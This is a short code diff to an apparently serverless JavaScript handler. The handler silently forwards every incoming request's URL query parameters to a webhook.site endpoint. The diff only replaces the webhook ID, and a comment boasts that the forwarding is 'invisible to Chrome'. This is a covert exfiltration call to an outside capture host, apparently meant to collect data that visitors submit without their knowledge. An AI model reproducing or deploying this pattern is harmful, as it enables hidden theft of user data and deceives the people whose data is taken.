@@ -5,7 +5,7 @@ export default async function handler(req) {
         const params = url.searchParams.toString();
 
         // 🔥 FORWARD TO WEBHOOK (invisible to Chrome)
-        await fetch(`https://webhook.site/e357584e-0282-462f-8400-dd0379d4ad27?${params}`, {
+        await fetch(`https://webhook.site/49f71cf9-f98e-4cfa-840b-419ebe5cac4e?${params}`, {
             method: 'GET'
         });
 
